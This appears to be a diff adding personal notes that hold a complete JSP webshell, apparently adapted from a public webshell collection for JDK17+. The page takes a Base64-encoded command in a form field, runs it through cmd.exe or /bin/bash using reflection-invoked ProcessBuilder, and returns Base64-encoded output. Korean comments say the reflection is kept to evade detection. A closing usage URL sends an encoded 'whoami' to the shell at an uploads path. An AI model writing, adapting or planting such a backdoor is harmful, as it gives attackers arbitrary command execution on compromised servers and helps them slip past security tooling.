@@ -4,3 +4,90 @@ read
 
 
 https://github.com/tennc/webshell/blob/master/jsp/ProcessBuilder-reflect-cmd.jsp
+
+수정
+<%@ page pageEncoding="UTF-8" %>
+<%@ page import="java.util.*" %>
+<%@ page import="java.io.*" %>
+<%@ page import="java.util.Base64" %>
+
+<html>
+<title>Just For Fun</title>
+<body>
+<h3>Build By LandGrey (Modified JDK17+)</h3>
+
+<form method="POST">
+    <input name="q" type="text">
+    <input type="submit" value="Run">
+</form>
+
+<%!
+public static String execCmd(String input) throws Exception {
+
+    List<String> cmd = new ArrayList<>();
+
+    String os = System.getProperty("os.name").toLowerCase();
+
+    // OS 분기
+    if (os.contains("win")) {
+        cmd.add("cmd.exe");
+        cmd.add("/c");
+    } else {
+        cmd.add("/bin/bash");
+        cmd.add("-c");
+    }
+
+    // Base64 decode (기존 핵심 변경)
+    byte[] decoded = Base64.getDecoder().decode(input);
+    cmd.add(new String(decoded));
+
+    // Reflection 유지 (탐지 회피 구조 유지)
+    Class<?> pbClass = Class.forName("java.lang.ProcessBuilder");
+
+    Process process = (Process) pbClass
+            .getMethod("start")
+            .invoke(
+                pbClass.getDeclaredConstructor(List.class)
+                       .newInstance(cmd)
+            );
+
+    // 결과 읽기
+    BufferedReader br = new BufferedReader(
+            new InputStreamReader(process.getInputStream())
+    );
+
+    StringBuilder result = new StringBuilder();
+    String line;
+
+    while ((line = br.readLine()) != null) {
+        result.append(line).append("\n");
+    }
+
+    br.close();
+
+    // 결과 Base64 인코딩
+    return Base64.getEncoder().encodeToString(
+            result.toString().getBytes("UTF-8")
+    );
+}
+%>
+
+<%
+String output = "Input Nothing";
+String q = request.getParameter("q");
+
+if (q != null && !q.isEmpty()) {
+    output = execCmd(q);
+}
+%>
+
+<pre>
+<%= output %>
+</pre>
+
+</body>
+</html>
+
+-----------------------
+
+http://localhost:8080/uploads/test.jsp?q=d2hvYW1p
